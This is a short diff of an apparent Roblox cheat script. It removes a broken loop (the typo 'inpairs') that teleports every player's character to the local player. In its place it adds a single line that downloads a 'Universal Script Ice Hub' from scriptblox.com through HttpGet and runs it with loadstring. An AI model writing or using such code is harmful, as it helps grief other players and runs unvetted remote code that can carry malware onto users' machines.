@@ -1,4 +1,1 @@
-target = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-
-for i, player in inpairs(game.Players:GetChildren()) do
-player.Character.HumanoidRootPart.CFrame = target
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Ice-Hub-6414"))()
